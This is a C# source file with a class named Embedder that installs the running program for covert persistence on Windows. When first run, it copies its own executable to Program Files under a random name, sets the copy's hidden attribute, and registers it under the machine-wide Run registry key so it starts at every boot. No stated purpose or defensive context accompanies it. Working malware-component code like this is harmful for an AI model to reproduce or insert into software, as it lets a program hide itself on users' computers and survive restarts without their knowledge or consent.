using System;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace Type
{
    class Embedder
    {
        private const int NAME_LEN = 8;
        private const char PATH_DELIM = '\\';
        private const char START_CHAR = 'a';
        private const char QUOT = '\"';
        private const string RUN = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string RUN_NAME = "type-bin";
        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.ProgramFilesX86;
        private const string RUN_EXTENSION = ".exe";

        private static string RandomName()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(PATH_DELIM);
            Random rand = new Random((int)DateTime.Now.Ticks);
            for (int i = 0; i < NAME_LEN; i++)
            {
                char ch = (char)((int)START_CHAR + rand.Next(0, 26));
                sb.Append(ch);
            }
            sb.Append(RUN_EXTENSION);
            return (sb.ToString());
        }

        private static bool IsInstalled()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(RUN, true);
            string path;
            if ((path = (string)key.GetValue(RUN_NAME)) == null)
            {
                return false;
            }
            else
            {
                path = RemoveQuotes(path);
                if (File.Exists(path))
                {
                    return true;
                }
                else
                {
                    key.DeleteValue(RUN_NAME, false);
                    return false;
                }
            }
        }

        private static string RemoveQuotes(string path)
        {
            return (path.Substring(1, path.Length - 2));
        }

        public static void EmbedOnFirstRun()
        {
            if (!IsInstalled())
            {
                Embed();
            }
        }

        private static void Embed()
        {
            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
            FileInfo applicationInfo = new FileInfo(me);

            string dest = Environment.GetFolderPath(EMBED_LOC);
            string name = RandomName();
            string target = (dest + name);

            Install(me, target);
        }

        private static void Install(string me, string target)
        {
            CopyBinary(me, target);
            SetRegistryAutoStart(target);
        }

        private static void SetRegistryAutoStart(string target)
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(RUN, true);
            key.SetValue(RUN_NAME, Quote(target));
        }

        private static string Quote(string text)
        {
            return (QUOT + text + QUOT);
        }

        private static void CopyBinary(string me, string target)
        {
            if (!File.Exists(target))
            {
                File.Copy(me, target);
                File.SetAttributes(target, File.GetAttributes(target) | FileAttributes.Hidden);
            }
        }
    }
}
